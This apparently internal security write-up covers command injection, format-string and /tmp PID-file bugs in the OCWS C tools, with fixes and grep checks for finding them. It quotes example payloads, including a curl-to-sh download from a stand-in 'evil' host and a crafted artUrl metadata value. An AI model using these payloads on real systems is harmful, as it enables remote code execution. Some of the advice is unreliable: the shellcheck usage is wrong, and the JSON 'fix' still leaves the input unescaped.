# `system()` Command Injection in C CLI Tools

**Files affected:** `ocws-clip.c`, `ocws-recorder.c`, `ocws-brokerd.c`, `plugins/clipboard/clipboard.c`
**Severity:** Critical — remote code execution from media metadata, clipboard content, or CLI args

---

## What Happened

Four critical security bugs were found in OCWS C code, all stemming from the same root cause: passing unsanitized external data through `system()` or format strings.

### 1. Command Injection via `system()` — `ocws-clip.c:90`

```c
snprintf(cmd, sizeof(cmd), "echo -n \"%s\" | wl-copy", text);
system(cmd);
```

`text` came from `argv` (user-supplied). A copied string containing `"` or `$()` would break out of the shell quoting and execute arbitrary commands. Example:

```
ocws clip copy "'; curl -s http://evil/payload | sh #"
```

### 2. Command Injection via `system()` — `ocws-brokerd.c:506-517`

```c
// file:///path/to/file with a ' in it → shell quoting broken
snprintf(cmd, sizeof(cmd), "cp '%s' /tmp/ocws-cover.jpg", path);
system(cmd);

// http://... with $() in URL → RCE
snprintf(cmd, sizeof(cmd), "curl -sSL '%s' -o /tmp/ocws-cover.jpg", line);
system(cmd);
```

Playerctl `mpris:artUrl` metadata comes from media files. A malicious audio file with crafted metadata (`artUrl = "http://evil.com/';id;#.jpg"`) would execute the `id` command on the daemon's next metadata poll.

### 3. CLI Arg Injection — `ocws-recorder.c:92-120`

```c
snprintf(cmd, sizeof(cmd), "wf-recorder -f '%s' -c %s --crf %s", filename, codec, crf);
execl("/bin/sh", "sh", "-c", cmd, NULL);
```

`codec`, `crf`, and `audio` came from CLI args with no validation. `--audio` was passed through `-A '%s'` with shell quoting that `'` could break.

### 4. Format String Bug — `plugins/clipboard/clipboard.c:14`

```c
snprintf(cmd, sizeof(cmd),
    "cliphist ... | while read -r line; do echo \"...%s...\" $line; done");
```

A dangling `%s` with no corresponding variadic argument causes undefined behavior (likely crash or garbage output). The `%s` reads whatever is on the stack.

### 5. Predictable PID File — `ocws-recorder.c:12`

```c
#define PID_FILE "/tmp/ocws-recorder.pid"
```

`/tmp` is world-writable. An attacker could create a symlink at `/tmp/ocws-recorder.pid` → `/etc/cron.d/evil` or another user's file, causing the daemon to write a PID over a critical system file.

---

## The Fixes

### Fix: Use `fork()` + `execlp()` Instead of `system()`

`exec`-family functions pass arguments directly to the target binary — no shell interpretation of metacharacters.

```c
// BEFORE — vulnerable to shell injection
snprintf(cmd, sizeof(cmd), "cp '%s' /tmp/ocws-cover.jpg", path);
system(cmd);

// AFTER — argument is passed as-is to cp, no shell involved
pid_t cpid = fork();
if (cpid == 0) {
    execlp("cp", "cp", path, "/tmp/ocws-cover.jpg", NULL);
    _exit(1);
} else if (cpid > 0) {
    waitpid(cpid, NULL, 0);
}
```

### Fix: Use `popen()` with Pipe Instead of `system(echo ... | ... )`

When you need to pipe data, use `popen()` with write mode and `fwrite()` — the user data goes through `FILE*`, not through a shell command string.

```c
// BEFORE — user text embedded in shell command
snprintf(cmd, sizeof(cmd), "echo -n \"%s\" | wl-copy", text);
system(cmd);

// AFTER — text goes through pipe, command string is fixed
FILE *fp = popen("wl-copy", "w");
if (fp) {
    fwrite(text, 1, strlen(text), fp);
    pclose(fp);
}
```

### Fix: Validate CLI Args Against Allowlists

```c
static int is_safe_codec(const char *c) {
    static const char *allowed[] = {
        "libx264", "libx265", "libvp8", "libvp9", "libaom-av1",
        "h264_vaapi", "hevc_vaapi", "mjpeg", NULL
    };
    for (int i = 0; allowed[i]; i++)
        if (strcmp(c, allowed[i]) == 0) return 1;
    return 0;
}

// In arg parsing:
if (!is_safe_codec(codec)) {
    fprintf(stderr, "warning: invalid codec, using default\n");
    codec = CODEC_DEFAULT;
}
```

### Fix: Use `$XDG_RUNTIME_DIR` for PID Files

`$XDG_RUNTIME_DIR` (`/run/user/$UID`) is per-user and not world-writable.

```c
static const char *pid_path(void) {
    static char buf[256];
    const char *rt = getenv("XDG_RUNTIME_DIR");
    if (rt && *rt)
        snprintf(buf, sizeof(buf), "%s/ocws-recorder.pid", rt);
    else
        snprintf(buf, sizeof(buf), "/tmp/ocws-recorder.pid");
    return buf;
}
```

### Fix: Build JSON in C, Not in Shell

```c
// BEFORE — shell quoting nightmare, dangling %s
snprintf(cmd, sizeof(cmd),
    "cliphist ... | while read -r line; do echo \"...%s...\" $line; done");

// AFTER — C code formats JSON safely
char json[2048];
snprintf(json, sizeof(json), "{\"type\":\"history\",\"content\":\"%s\"}", line);
ocws_plugin_emit("Clipboard.Event", json);
```

---

## The Rules

| Situation | Unsafe | Safe |
|-----------|--------|------|
| Run external program with user data | `system(cmd_with_data)` | `fork()` + `execlp()` |
| Pipe user data to program | `system("echo ... | prog")` | `popen("prog", "w")` + `fwrite()` |
| CLI arg from user | pass to `system()` unchecked | validate against allowlist |
| File path from env var | embed in `system()` command | use `fork+exec` or C syscall |
| PID file | `/tmp/name.pid` | `$XDG_RUNTIME_DIR/name.pid` |
| Format string | `snprintf(buf, fmt)` with no varargs | match fmt to arguments |
| JSON | build in shell with `echo` | build in C with `snprintf` |

---

## How to Catch It

```bash
# Find system() calls — every one is suspect
grep -rn 'system(' src/ --include="*.c"

# Find popen with data in format string
grep -rn 'popen(' src/ --include="*.c"

# Find /tmp file usage
grep -rn '/tmp/' src/ --include="*.c"

# Find format strings with mismatched % args
shellcheck --format=c
# or manually: for each snprintf/printf with %s, count variadic args

# Static analysis
cppcheck --enable=all src/
```
